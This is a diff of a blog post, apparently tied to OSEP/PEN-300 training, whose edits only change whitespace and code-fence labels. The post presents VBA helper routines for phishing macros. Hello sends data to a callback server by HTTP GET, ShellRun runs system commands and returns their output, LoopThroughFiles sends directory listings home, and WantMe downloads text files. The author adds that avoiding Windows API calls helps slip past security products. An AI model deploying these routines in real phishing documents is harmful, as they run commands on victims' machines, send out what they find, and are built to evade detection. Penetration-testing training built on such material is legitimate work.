@@ -5,13 +5,13 @@ categories: ["Programming", "Security"]
 tags: ["OSEP", "PEN300", "VBA", "VBS", "HTA", "HTTP"]
 ---
 
-Raise your hand if you crafted well your payload and the payload worked well in your lab machines but in the real scenario you're not receiving the callback! I guess all of us at some point have experienced this.  
+Raise your hand if you crafted well your payload and the payload worked well in your lab machines but in the real scenario you're not receiving the callback! I guess all of us at some point have experienced this.
 
-To solve this I wrote a simple and yet effective set of functions that allow us to see what going on while the runtime of our script. 
+To solve this I wrote a simple and yet effective set of functions that allow us to see what going on while the runtime of our script.
 
 The first function/subroutine, which I called hello simply sends an GET request to a specified server.
 
-```VB
+```VB.net
 Sub Hello(message)
 	On Error GoTo Done
 	Dim MyRequest As Object
@@ -26,11 +26,11 @@ Sub Hello(message)
 End Sub
 ```
 
-This is the main important one, since we are relying on the HTTP protocol to call home after executing an action. 
+This is the main important one, since we are relying on the HTTP protocol to call home after executing an action.
 
-The second important one is ShellRun, this function run a system command and returns the captured output of the command. 
+The second important one is ShellRun, this function run a system command and returns the captured output of the command.
 
-```VB
+```VB.net
 Function ShellRun(sCmd As String) As String
 	'Run a shell command, returning the output as a string
 	Dim oShell As Object
@@ -56,7 +56,7 @@ End Function
 
 In conjunction with Hello, this gives us a visibility of what is going on while the runtime of our phishing script.
 
-```VB
+```VB.net
 Hello (ShellRun("ping google.com"))
 ```
 
@@ -64,7 +64,7 @@ Bonus:
 
 One of the other helpers, I wrote is LoopThroughFiles() this print the content of the provider directory.
 
-```VB
+```VB.net
 Sub LoopThroughFiles(path)
 	On Error GoTo Done
 	Dim oFSO As Object
@@ -86,13 +86,13 @@ End Sub
 
 The subroutine relies on Hello subroutine, this could be used as shown below:
 
-```VB
+```VB.net
 LoopThroughFiles ("C:\Windows\Tasks")
 ```
 
 I will finish this post with an extra subroutine that download text files, no binary files.
 
-```VB
+```VB.net
 Sub WantMe(pie)
 	Dim myURL As String
 	myURL = "http://127.0.0.1/" & pie
@@ -113,6 +113,6 @@ Sub WantMe(pie)
 End Sub
 ```
 
-Nothing special really here, just a set of function helpers to facilitate things, if you noticed we have not used native Windows API and that's for a reason and the reason for that is portability of the code (few changes) when porting it VBS/HTA, also using native Windows API in Macro could be treated as a red flag by a security product. 
+Nothing special really here, just a set of function helpers to facilitate things, if you noticed we have not used native Windows API and that's for a reason and the reason for that is portability of the code (few changes) when porting it VBS/HTA, also using native Windows API in Macro could be treated as a red flag by a security product.
 
-Thanks  for ready!
+Thanks for ready!
